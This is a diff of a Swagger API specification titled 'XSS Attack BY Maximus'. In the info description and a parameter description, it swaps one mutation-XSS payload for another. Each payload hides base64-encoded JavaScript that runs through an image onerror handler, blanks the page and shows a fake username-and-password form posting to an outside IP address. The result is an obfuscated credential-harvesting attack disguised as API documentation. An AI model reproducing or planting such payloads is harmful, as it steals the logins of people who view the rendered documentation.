@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Maximus
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzthLmFjdGlvbj0naHR0cDovLzE2NC45MC4xNzQuMTU5OjEzMzcnO2EuaW5uZXJIVE1MPSc8Y2VudGVyPjxicj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT1wd2Q+PGJyPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9jZW50ZXI+JzsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsg' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovLzE2Mi4yMjMuODkuNzc6OTk5OCI7YS5tZXRob2Q9J1BPU1QnO2EuaW5uZXJIVE1MPSc8Y2VudGVyPlVzZXJuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzthLmFjdGlvbj0naHR0cDovLzE2NC45MC4xNzQuMTU5OjEzMzcnO2EuaW5uZXJIVE1MPSc8Y2VudGVyPjxicj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT1wd2Q+PGJyPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9jZW50ZXI+JzsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsg' onerror='eval(atob(this.id))'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovLzE2Mi4yMjMuODkuNzc6OTk5OCI7YS5tZXRob2Q9J1BPU1QnO2EuaW5uZXJIVE1MPSc8Y2VudGVyPlVzZXJuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
 
           format: int64
           in: path
